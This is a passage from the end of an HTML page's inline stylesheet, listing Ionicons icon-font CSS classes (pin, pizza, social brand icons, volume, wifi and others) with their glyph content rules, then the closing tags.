.ion-pin::before { content: ""; }

.ion-pinpoint::before { content: ""; }

.ion-pizza::before { content: ""; }

.ion-plane::before { content: ""; }

.ion-planet::before { content: ""; }

.ion-play::before { content: ""; }

.ion-playstation::before { content: ""; }

.ion-plus::before { content: ""; }

.ion-plus-circled::before { content: ""; }

.ion-plus-round::before { content: ""; }

.ion-podium::before { content: ""; }

.ion-pound::before { content: ""; }

.ion-power::before { content: ""; }

.ion-pricetag::before { content: ""; }

.ion-pricetags::before { content: ""; }

.ion-printer::before { content: ""; }

.ion-pull-request::before { content: ""; }

.ion-qr-scanner::before { content: ""; }

.ion-quote::before { content: ""; }

.ion-radio-waves::before { content: ""; }

.ion-record::before { content: ""; }

.ion-refresh::before { content: ""; }

.ion-reply::before { content: ""; }

.ion-reply-all::before { content: ""; }

.ion-ribbon-a::before { content: ""; }

.ion-ribbon-b::before { content: ""; }

.ion-sad::before { content: ""; }

.ion-sad-outline::before { content: ""; }

.ion-scissors::before { content: ""; }

.ion-search::before { content: ""; }

.ion-settings::before { content: ""; }

.ion-share::before { content: ""; }

.ion-shuffle::before { content: ""; }

.ion-skip-backward::before { content: ""; }

.ion-skip-forward::before { content: ""; }

.ion-social-android::before { content: ""; }

.ion-social-android-outline::before { content: ""; }

.ion-social-angular::before { content: ""; }

.ion-social-angular-outline::before { content: ""; }

.ion-social-apple::before { content: ""; }

.ion-social-apple-outline::before { content: ""; }

.ion-social-bitcoin::before { content: ""; }

.ion-social-bitcoin-outline::before { content: ""; }

.ion-social-buffer::before { content: ""; }

.ion-social-buffer-outline::before { content: ""; }

.ion-social-chrome::before { content: ""; }

.ion-social-chrome-outline::before { content: ""; }

.ion-social-codepen::before { content: ""; }

.ion-social-codepen-outline::before { content: ""; }

.ion-social-css3::before { content: ""; }

.ion-social-css3-outline::before { content: ""; }

.ion-social-designernews::before { content: ""; }

.ion-social-designernews-outline::before { content: ""; }

.ion-social-dribbble::before { content: ""; }

.ion-social-dribbble-outline::before { content: ""; }

.ion-social-dropbox::before { content: ""; }

.ion-social-dropbox-outline::before { content: ""; }

.ion-social-euro::before { content: ""; }

.ion-social-euro-outline::before { content: ""; }

.ion-social-facebook::before { content: ""; }

.ion-social-facebook-outline::before { content: ""; }

.ion-social-foursquare::before { content: ""; }

.ion-social-foursquare-outline::before { content: ""; }

.ion-social-freebsd-devil::before { content: ""; }

.ion-social-github::before { content: ""; }

.ion-social-github-outline::before { content: ""; }

.ion-social-google::before { content: ""; }

.ion-social-google-outline::before { content: ""; }

.ion-social-googleplus::before { content: ""; }

.ion-social-googleplus-outline::before { content: ""; }

.ion-social-hackernews::before { content: ""; }

.ion-social-hackernews-outline::before { content: ""; }

.ion-social-html5::before { content: ""; }

.ion-social-html5-outline::before { content: ""; }

.ion-social-instagram::before { content: ""; }

.ion-social-instagram-outline::before { content: ""; }

.ion-social-javascript::before { content: ""; }

.ion-social-javascript-outline::before { content: ""; }

.ion-social-linkedin::before { content: ""; }

.ion-social-linkedin-outline::before { content: ""; }

.ion-social-markdown::before { content: ""; }

.ion-social-nodejs::before { content: ""; }

.ion-social-octocat::before { content: ""; }

.ion-social-pinterest::before { content: ""; }

.ion-social-pinterest-outline::before { content: ""; }

.ion-social-python::before { content: ""; }

.ion-social-reddit::before { content: ""; }

.ion-social-reddit-outline::before { content: ""; }

.ion-social-rss::before { content: ""; }

.ion-social-rss-outline::before { content: ""; }

.ion-social-sass::before { content: ""; }

.ion-social-skype::before { content: ""; }

.ion-social-skype-outline::before { content: ""; }

.ion-social-snapchat::before { content: ""; }

.ion-social-snapchat-outline::before { content: ""; }

.ion-social-tumblr::before { content: ""; }

.ion-social-tumblr-outline::before { content: ""; }

.ion-social-tux::before { content: ""; }

.ion-social-twitch::before { content: ""; }

.ion-social-twitch-outline::before { content: ""; }

.ion-social-twitter::before { content: ""; }

.ion-social-twitter-outline::before { content: ""; }

.ion-social-usd::before { content: ""; }

.ion-social-usd-outline::before { content: ""; }

.ion-social-vimeo::before { content: ""; }

.ion-social-vimeo-outline::before { content: ""; }

.ion-social-whatsapp::before { content: ""; }

.ion-social-whatsapp-outline::before { content: ""; }

.ion-social-windows::before { content: ""; }

.ion-social-windows-outline::before { content: ""; }

.ion-social-wordpress::before { content: ""; }

.ion-social-wordpress-outline::before { content: ""; }

.ion-social-yahoo::before { content: ""; }

.ion-social-yahoo-outline::before { content: ""; }

.ion-social-yen::before { content: ""; }

.ion-social-yen-outline::before { content: ""; }

.ion-social-youtube::before { content: ""; }

.ion-social-youtube-outline::before { content: ""; }

.ion-soup-can::before { content: ""; }

.ion-soup-can-outline::before { content: ""; }

.ion-speakerphone::before { content: ""; }

.ion-speedometer::before { content: ""; }

.ion-spoon::before { content: ""; }

.ion-star::before { content: ""; }

.ion-stats-bars::before { content: ""; }

.ion-steam::before { content: ""; }

.ion-stop::before { content: ""; }

.ion-thermometer::before { content: ""; }

.ion-thumbsdown::before { content: ""; }

.ion-thumbsup::before { content: ""; }

.ion-toggle::before { content: ""; }

.ion-toggle-filled::before { content: ""; }

.ion-transgender::before { content: ""; }

.ion-trash-a::before { content: ""; }

.ion-trash-b::before { content: ""; }

.ion-trophy::before { content: ""; }

.ion-tshirt::before { content: ""; }

.ion-tshirt-outline::before { content: ""; }

.ion-umbrella::before { content: ""; }

.ion-university::before { content: ""; }

.ion-unlocked::before { content: ""; }

.ion-upload::before { content: ""; }

.ion-usb::before { content: ""; }

.ion-videocamera::before { content: ""; }

.ion-volume-high::before { content: ""; }

.ion-volume-low::before { content: ""; }

.ion-volume-medium::before { content: ""; }

.ion-volume-mute::before { content: ""; }

.ion-wand::before { content: ""; }

.ion-waterdrop::before { content: ""; }

.ion-wifi::before { content: ""; }

.ion-wineglass::before { content: ""; }

.ion-woman::before { content: ""; }

.ion-wrench::before { content: ""; }

.ion-xbox::before { content: ""; }
</style>
</body>
</html>